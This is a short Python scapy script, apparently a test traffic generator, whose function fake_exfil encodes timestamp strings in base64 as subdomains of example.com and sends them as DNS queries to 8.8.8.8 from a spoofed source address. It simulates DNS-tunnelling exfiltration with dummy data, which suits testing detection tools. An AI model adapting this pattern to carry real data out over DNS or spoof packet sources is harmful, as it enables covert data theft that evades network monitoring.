#!/usr/bin/env python

from scapy.all import *
import time
import base64
import random

def send_packet(query, src, dst="8.8.8.8"):
        send(IP(src=src, dst=dst)/UDP(dport=53)/DNS(rd=1,qd=DNSQR(qname=query)),verbose=0)


def fake_exfil():
    for x in range(random.randint(1,10)):
        source_data = str(time.time()) * 5
        subdomain = base64.b64encode(source_data)
        fqdn = "{0}.example.com".format(subdomain)
        send_packet(fqdn, "10.42.0.7")
        time.sleep(1)



fake_exfil()

